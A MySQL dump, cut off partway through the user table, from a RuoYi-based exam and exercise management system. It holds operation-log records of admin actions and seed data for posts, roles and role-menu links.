INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (489, '菜单管理', 3, 'com.ruoyi.project.system.controller.SysMenuController.remove()', 'DELETE', 1, 'admin', NULL, '/system/menu/1056', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-07 14:36:01', 38);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (490, '菜单管理', 3, 'com.ruoyi.project.system.controller.SysMenuController.remove()', 'DELETE', 1, 'admin', NULL, '/system/menu/1057', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-07 14:36:04', 43);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (491, '菜单管理', 3, 'com.ruoyi.project.system.controller.SysMenuController.remove()', 'DELETE', 1, 'admin', NULL, '/system/menu/1058', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-07 14:36:07', 35);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (492, '菜单管理', 3, 'com.ruoyi.project.system.controller.SysMenuController.remove()', 'DELETE', 1, 'admin', NULL, '/system/menu/1059', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-07 14:36:10', 31);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (493, '菜单管理', 3, 'com.ruoyi.project.system.controller.SysMenuController.remove()', 'DELETE', 1, 'admin', NULL, '/system/menu/1060', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-07 14:36:12', 38);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (494, '菜单管理', 3, 'com.ruoyi.project.system.controller.SysMenuController.remove()', 'DELETE', 1, 'admin', NULL, '/system/menu/116', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-07 14:36:14', 24);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (495, '菜单管理', 3, 'com.ruoyi.project.system.controller.SysMenuController.remove()', 'DELETE', 1, 'admin', NULL, '/system/menu/3', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-07 14:36:17', 38);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (496, '菜单管理', 3, 'com.ruoyi.project.system.controller.SysMenuController.remove()', 'DELETE', 1, 'admin', NULL, '/system/menu/114', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-07 14:38:05', 32);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (497, '菜单管理', 3, 'com.ruoyi.project.system.controller.SysMenuController.remove()', 'DELETE', 1, 'admin', NULL, '/system/menu/113', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-07 14:38:12', 38);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (498, '菜单管理', 3, 'com.ruoyi.project.system.controller.SysMenuController.remove()', 'DELETE', 1, 'admin', NULL, '/system/menu/111', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-07 14:38:16', 52);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (499, '菜单管理', 3, 'com.ruoyi.project.system.controller.SysMenuController.remove()', 'DELETE', 1, 'admin', NULL, '/system/menu/1049', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-07 14:38:27', 13);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (500, '菜单管理', 3, 'com.ruoyi.project.system.controller.SysMenuController.remove()', 'DELETE', 1, 'admin', NULL, '/system/menu/1051', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-07 14:38:30', 48);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (501, '菜单管理', 3, 'com.ruoyi.project.system.controller.SysMenuController.remove()', 'DELETE', 1, 'admin', NULL, '/system/menu/1050', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-07 14:38:33', 34);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (502, '菜单管理', 3, 'com.ruoyi.project.system.controller.SysMenuController.remove()', 'DELETE', 1, 'admin', NULL, '/system/menu/1052', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-07 14:38:36', 39);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (503, '菜单管理', 3, 'com.ruoyi.project.system.controller.SysMenuController.remove()', 'DELETE', 1, 'admin', NULL, '/system/menu/1053', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-07 14:38:39', 33);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (504, '菜单管理', 3, 'com.ruoyi.project.system.controller.SysMenuController.remove()', 'DELETE', 1, 'admin', NULL, '/system/menu/1054', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-07 14:38:42', 38);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (505, '菜单管理', 3, 'com.ruoyi.project.system.controller.SysMenuController.remove()', 'DELETE', 1, 'admin', NULL, '/system/menu/110', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-07 14:38:45', 33);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (506, '菜单管理', 2, 'com.ruoyi.project.system.controller.SysMenuController.edit()', 'PUT', 1, 'admin', NULL, '/system/menu', '127.0.0.1', '内网IP', '{\"children\":[],\"component\":\"system/menu/index\",\"createTime\":\"2023-10-23 20:57:31\",\"icon\":\"tree-table\",\"isCache\":\"0\",\"isFrame\":\"1\",\"menuId\":102,\"menuName\":\"菜单管理\",\"menuType\":\"C\",\"orderNum\":3,\"params\":{},\"parentId\":1,\"path\":\"menu\",\"perms\":\"system:menu:list\",\"query\":\"\",\"status\":\"1\",\"updateBy\":\"admin\",\"visible\":\"0\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-07 14:39:32', 33);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (507, '个人信息', 2, 'com.ruoyi.project.system.controller.SysProfileController.updateProfile()', 'PUT', 1, 'admin', NULL, '/system/user/profile', '127.0.0.1', '内网IP', '{\"admin\":true,\"avatar\":\"\",\"createBy\":\"admin\",\"createTime\":\"2023-10-23 20:57:31\",\"delFlag\":\"0\",\"dept\":{\"ancestors\":\"0,100\",\"children\":[],\"deptId\":101,\"deptName\":\"管理部门\",\"leader\":\"若依\",\"orderNum\":1,\"params\":{\"@type\":\"java.util.HashMap\"},\"parentId\":100,\"status\":\"0\"},\"deptId\":101,\"email\":\"admin@163.com1\",\"loginDate\":\"2023-11-07 21:02:09\",\"loginIp\":\"127.0.0.1\",\"nickName\":\"超级管理员\",\"params\":{\"@type\":\"java.util.HashMap\"},\"phonenumber\":\"15888888888\",\"remark\":\"管理员\",\"roles\":[{\"admin\":true,\"dataScope\":\"1\",\"deptCheckStrictly\":false,\"flag\":false,\"menuCheckStrictly\":false,\"params\":{\"@type\":\"java.util.HashMap\"},\"roleId\":1,\"roleKey\":\"admin\",\"roleName\":\"超级管理员\",\"roleSort\":1,\"status\":\"0\"}],\"sex\":\"1\",\"status\":\"0\",\"userId\":1,\"userName\":\"admin\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-07 21:19:35', 97);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (508, '题目管理', 1, 'com.ruoyi.project.cspApi.dataControl.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"12\",\"choiceA\":\"aaa\",\"choiceB\":\"bbb\",\"choiceC\":\"bbb\",\"choiceD\":\"bbb\",\"correctAnswer\":\"B\",\"exerciseTitle\":\"<p><img src=\\\"/dev-api/profile/upload/2023/11/09/1425_20231109213457A001.png\\\"></p>\",\"exerciseType\":0,\"params\":{},\"quesType\":0}', NULL, 1, '', '2023-11-09 21:35:33', 26576);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (509, '题目管理', 1, 'com.ruoyi.project.cspApi.dataControl.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"12\",\"choiceA\":\"aaa\",\"choiceB\":\"bbb\",\"choiceC\":\"bbb\",\"choiceD\":\"bbb\",\"correctAnswer\":\"B\",\"createBy\":\"admin\",\"createTime\":\"2023-11-09 21:39:31\",\"exerciseTitle\":\"<p><img src=\\\"null:null/profile/upload/2023/11/09/1425_20231109213457A001.png\\\"></p>\",\"exerciseType\":0,\"id\":98,\"params\":{},\"quesType\":0}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":98}', 0, NULL, '2023-11-09 21:39:31', 194906);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (510, '题目管理', 1, 'com.ruoyi.project.cspApi.dataControl.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"choiceA\":\"a\",\"choiceB\":\"s\",\"choiceC\":\"a\",\"choiceD\":\"s\",\"correctAnswer\":\"A\",\"createBy\":\"admin\",\"createTime\":\"2023-11-09 21:47:47\",\"exerciseTitle\":\"<p><img src=\\\"http://127.0.0.1:7070/profile/upload/2023/11/09/1425_20231109214717A001.png\\\"></p>\",\"exerciseType\":0,\"id\":101,\"params\":{},\"quesType\":0}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":101}', 0, NULL, '2023-11-09 21:47:47', 25019);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (511, '题目管理', 1, 'com.ruoyi.project.cspApi.dataControl.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"choiceA\":\"a\",\"choiceB\":\"s\",\"choiceC\":\"a\",\"choiceD\":\"s\",\"correctAnswer\":\"A\",\"createBy\":\"admin\",\"createTime\":\"2023-11-09 21:48:31\",\"exerciseTitle\":\"<p><img src=\\\"http://127.0.0.1:7070/profile/upload/2023/11/09/1425_20231109214717A001.png\\\"></p>\",\"exerciseType\":0,\"id\":102,\"params\":{},\"quesType\":0}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":102}', 0, NULL, '2023-11-09 21:48:31', 78);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (512, '题目管理', 3, 'com.ruoyi.project.cspApi.dataControl.ExerciseController.remove()', 'DELETE', 1, 'admin', NULL, '/dataControl/exercise/101', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-09 21:48:39', 25);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (513, '题目管理', 3, 'com.ruoyi.project.cspApi.dataControl.ExerciseController.remove()', 'DELETE', 1, 'admin', NULL, '/dataControl/exercise/102', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-09 21:48:54', 16);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (514, '题目管理', 3, 'com.ruoyi.project.cspApi.dataControl.ExerciseController.remove()', 'DELETE', 1, 'admin', NULL, '/dataControl/exercise/98', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-09 21:49:04', 24);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (515, '题目管理', 3, 'com.ruoyi.project.cspApi.dataControl.ExerciseController.remove()', 'DELETE', 1, 'admin', NULL, '/dataControl/exercise/99', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-09 21:49:06', 17);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (516, '题目管理', 3, 'com.ruoyi.project.cspApi.dataControl.ExerciseController.remove()', 'DELETE', 1, 'admin', NULL, '/dataControl/exercise/100', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-09 21:49:07', 14);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (517, '题目管理', 1, 'com.ruoyi.project.cspApi.dataControl.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"asd\",\"choiceA\":\"a s d\",\"choiceB\":\"asd\",\"choiceC\":\"sad\",\"choiceD\":\"asd\",\"correctAnswer\":\"C\",\"createBy\":\"admin\",\"createTime\":\"2023-11-10 10:54:29\",\"exerciseTitle\":\"<p><img src=\\\"http://127.0.0.1:8000/dev-api/profile/upload/2023/11/10/logo_20231110105424A001.png\\\"></p>\",\"exerciseType\":0,\"id\":103,\"params\":{},\"quesType\":0,\"remark\":\"asd\"}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":103}', 0, NULL, '2023-11-10 10:54:29', 78);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (518, '题目管理', 3, 'com.ruoyi.project.cspApi.dataControl.ExerciseController.remove()', 'DELETE', 1, 'admin', NULL, '/dataControl/exercise/103', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-10 10:54:35', 113);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (519, '考试管理', 1, 'com.ruoyi.project.cspApi.dataControl.TbExamController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exam', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-11-15 10:08:23\",\"duration\":23,\"examName\":\"11\",\"id\":7,\"isDelete\":0,\"paperId\":8,\"params\":{},\"users\":[100,1]}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-15 10:08:23', 68);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (520, '考试管理', 2, 'com.ruoyi.project.cspApi.dataControl.TbExamController.edit()', 'PUT', 1, 'admin', NULL, '/dataControl/exam', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-11-15 10:08:24\",\"duration\":23,\"examName\":\"11\",\"id\":7,\"isDelete\":0,\"paperId\":8,\"paperName\":\"测试考试试卷\",\"params\":{},\"updateBy\":\"admin\",\"updateTime\":\"2023-11-15 10:29:02\",\"users\":[1,100]}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-15 10:29:02', 26);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (521, '考试管理', 1, 'com.ruoyi.project.cspApi.dataControl.TbExamController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exam', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-11-15 10:31:36\",\"duration\":1,\"examName\":\"12\",\"id\":8,\"isDelete\":0,\"paperId\":8,\"params\":{},\"users\":[100,101,102,103]}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-15 10:31:36', 41);
COMMIT;

-- ----------------------------
-- Table structure for sys_post
-- ----------------------------
DROP TABLE IF EXISTS `sys_post`;
CREATE TABLE `sys_post` (
  `post_id` bigint NOT NULL AUTO_INCREMENT COMMENT '岗位ID',
  `post_code` varchar(64) COLLATE utf8mb4_general_ci NOT NULL COMMENT '岗位编码',
  `post_name` varchar(50) COLLATE utf8mb4_general_ci NOT NULL COMMENT '岗位名称',
  `post_sort` int NOT NULL COMMENT '显示顺序',
  `status` char(1) COLLATE utf8mb4_general_ci NOT NULL COMMENT '状态（0正常 1停用）',
  `create_by` varchar(64) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT '创建者',
  `create_time` datetime DEFAULT NULL COMMENT '创建时间',
  `update_by` varchar(64) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT '更新者',
  `update_time` datetime DEFAULT NULL COMMENT '更新时间',
  `remark` varchar(500) COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '备注',
  PRIMARY KEY (`post_id`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci COMMENT='岗位信息表';

-- ----------------------------
-- Records of sys_post
-- ----------------------------
BEGIN;
INSERT INTO `sys_post` (`post_id`, `post_code`, `post_name`, `post_sort`, `status`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (1, 'ceo', '董事长', 1, '0', 'admin', '2023-10-23 20:57:31', '', NULL, '');
INSERT INTO `sys_post` (`post_id`, `post_code`, `post_name`, `post_sort`, `status`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (2, 'se', '项目经理', 2, '0', 'admin', '2023-10-23 20:57:31', '', NULL, '');
INSERT INTO `sys_post` (`post_id`, `post_code`, `post_name`, `post_sort`, `status`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (3, 'hr', '人力资源', 3, '0', 'admin', '2023-10-23 20:57:31', '', NULL, '');
INSERT INTO `sys_post` (`post_id`, `post_code`, `post_name`, `post_sort`, `status`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (4, 'user', '普通员工', 4, '0', 'admin', '2023-10-23 20:57:31', '', NULL, '');
COMMIT;

-- ----------------------------
-- Table structure for sys_role
-- ----------------------------
DROP TABLE IF EXISTS `sys_role`;
CREATE TABLE `sys_role` (
  `role_id` bigint NOT NULL AUTO_INCREMENT COMMENT '角色ID',
  `role_name` varchar(30) COLLATE utf8mb4_general_ci NOT NULL COMMENT '角色名称',
  `role_key` varchar(100) COLLATE utf8mb4_general_ci NOT NULL COMMENT '角色权限字符串',
  `role_sort` int NOT NULL COMMENT '显示顺序',
  `data_scope` char(1) COLLATE utf8mb4_general_ci DEFAULT '1' COMMENT '数据范围（1：全部数据权限 2：自定数据权限 3：本部门数据权限 4：本部门及以下数据权限）',
  `menu_check_strictly` tinyint(1) DEFAULT '1' COMMENT '菜单树选择项是否关联显示',
  `dept_check_strictly` tinyint(1) DEFAULT '1' COMMENT '部门树选择项是否关联显示',
  `status` char(1) COLLATE utf8mb4_general_ci NOT NULL COMMENT '角色状态（0正常 1停用）',
  `del_flag` char(1) COLLATE utf8mb4_general_ci DEFAULT '0' COMMENT '删除标志（0代表存在 2代表删除）',
  `create_by` varchar(64) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT '创建者',
  `create_time` datetime DEFAULT NULL COMMENT '创建时间',
  `update_by` varchar(64) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT '更新者',
  `update_time` datetime DEFAULT NULL COMMENT '更新时间',
  `remark` varchar(500) COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '备注',
  PRIMARY KEY (`role_id`)
) ENGINE=InnoDB AUTO_INCREMENT=102 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci COMMENT='角色信息表';

-- ----------------------------
-- Records of sys_role
-- ----------------------------
BEGIN;
INSERT INTO `sys_role` (`role_id`, `role_name`, `role_key`, `role_sort`, `data_scope`, `menu_check_strictly`, `dept_check_strictly`, `status`, `del_flag`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (1, '超级管理员', 'admin', 1, '1', 1, 1, '0', '0', 'admin', '2023-10-23 20:57:31', '', NULL, '超级管理员');
INSERT INTO `sys_role` (`role_id`, `role_name`, `role_key`, `role_sort`, `data_scope`, `menu_check_strictly`, `dept_check_strictly`, `status`, `del_flag`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (2, '普通角色', 'common', 3, '2', 1, 1, '0', '2', 'admin', '2023-10-23 20:57:31', 'admin', '2023-10-25 15:30:12', '普通角色');
INSERT INTO `sys_role` (`role_id`, `role_name`, `role_key`, `role_sort`, `data_scope`, `menu_check_strictly`, `dept_check_strictly`, `status`, `del_flag`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (100, '普通管理员', 'common-admin', 2, '1', 1, 1, '0', '0', 'admin', '2023-10-25 15:29:23', 'admin', '2023-10-31 15:51:21', '普通管理员，仅具备数据管理权限');
INSERT INTO `sys_role` (`role_id`, `role_name`, `role_key`, `role_sort`, `data_scope`, `menu_check_strictly`, `dept_check_strictly`, `status`, `del_flag`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (101, '学生', 'student', 3, '1', 1, 1, '0', '0', 'admin', '2023-10-25 15:31:49', 'admin', '2023-11-07 11:29:25', NULL);
COMMIT;

-- ----------------------------
-- Table structure for sys_role_dept
-- ----------------------------
DROP TABLE IF EXISTS `sys_role_dept`;
CREATE TABLE `sys_role_dept` (
  `role_id` bigint NOT NULL COMMENT '角色ID',
  `dept_id` bigint NOT NULL COMMENT '部门ID',
  PRIMARY KEY (`role_id`,`dept_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci COMMENT='角色和部门关联表';

-- ----------------------------
-- Records of sys_role_dept
-- ----------------------------
BEGIN;
COMMIT;

-- ----------------------------
-- Table structure for sys_role_menu
-- ----------------------------
DROP TABLE IF EXISTS `sys_role_menu`;
CREATE TABLE `sys_role_menu` (
  `role_id` bigint NOT NULL COMMENT '角色ID',
  `menu_id` bigint NOT NULL COMMENT '菜单ID',
  PRIMARY KEY (`role_id`,`menu_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci COMMENT='角色和菜单关联表';

-- ----------------------------
-- Records of sys_role_menu
-- ----------------------------
BEGIN;
INSERT INTO `sys_role_menu` (`role_id`, `menu_id`) VALUES (100, 2009);
INSERT INTO `sys_role_menu` (`role_id`, `menu_id`) VALUES (100, 2010);
INSERT INTO `sys_role_menu` (`role_id`, `menu_id`) VALUES (100, 2011);
INSERT INTO `sys_role_menu` (`role_id`, `menu_id`) VALUES (100, 2012);
INSERT INTO `sys_role_menu` (`role_id`, `menu_id`) VALUES (100, 2013);
INSERT INTO `sys_role_menu` (`role_id`, `menu_id`) VALUES (100, 2014);
INSERT INTO `sys_role_menu` (`role_id`, `menu_id`) VALUES (100, 2015);
INSERT INTO `sys_role_menu` (`role_id`, `menu_id`) VALUES (101, 2034);
INSERT INTO `sys_role_menu` (`role_id`, `menu_id`) VALUES (101, 2035);
INSERT INTO `sys_role_menu` (`role_id`, `menu_id`) VALUES (101, 2036);
COMMIT;

-- ----------------------------
-- Table structure for sys_user
-- ----------------------------
DROP TABLE IF EXISTS `sys_user`;
CREATE TABLE `sys_user` (
  `user_id` bigint NOT NULL AUTO_INCREMENT COMMENT '用户ID',
  `dept_id` bigint DEFAULT NULL COMMENT '部门ID',
  `user_name` varchar(30) COLLATE utf8mb4_general_ci NOT NULL COMMENT '用户账号',
  `nick_name` varchar(30) COLLATE utf8mb4_general_ci NOT NULL COMMENT '用户昵称',
  `user_type` varchar(2) COLLATE utf8mb4_general_ci DEFAULT '00' COMMENT '用户类型（00系统用户）',
